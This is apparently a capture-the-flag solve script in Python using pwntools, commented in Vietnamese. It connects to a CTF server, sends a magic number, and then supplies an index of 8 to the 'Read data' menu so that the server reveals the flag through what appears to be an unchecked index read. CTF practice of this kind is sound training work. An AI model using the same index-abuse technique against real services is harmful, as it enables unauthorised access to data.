from pwn import *

# Thông tin của server CTF
HOST = 'play.scriptsorcerers.xyz'
PORT = 10456

# File binary chỉ dùng để phân tích
# Bạn nên cung cấp đường dẫn chính xác tới file binary trên máy Linux của bạn
# ví dụ: elf = context.binary = ELF('./index')

# Kết nối đến server
p = remote(HOST, PORT)

# --- Các bước khai thác ---

# Bước 1: Gửi số "thần kỳ" 1337
# Chờ đến khi server hiện menu. Dòng cuối của menu là "4. Exit\n"
log.info("Waiting for the first menu...")
p.recvuntil(b'4. Exit\n')
log.info("Sending magic number 1337 to load the flag...")
p.sendline(b'1337')

# Bước 2: Chọn chức năng "2. Read data"
# Chờ menu tiếp theo xuất hiện
log.info("Waiting for the second menu...")
p.recvuntil(b'4. Exit\n')
log.info("Selecting option 2 (Read data)...")
p.sendline(b'2')

# Bước 3: Gửi index đã tính toán (8)
# Chờ server hỏi "Index: "
log.info("Waiting for 'Index: ' prompt...")
p.recvuntil(b'Index: ')
calculated_index = 8
log.info(f"Sending calculated index: {calculated_index}")
p.sendline(str(calculated_index).encode())

# Bước 4: Nhận và in ra cờ
# Tìm dòng có chữ "Data: " và lấy phần tiếp theo
log.info("Receiving the flag...")
p.recvuntil(b'Data: ')
flag = p.recvline().strip()

log.success(f"Flag found: {flag.decode()}")

# Đóng kết nối
p.close()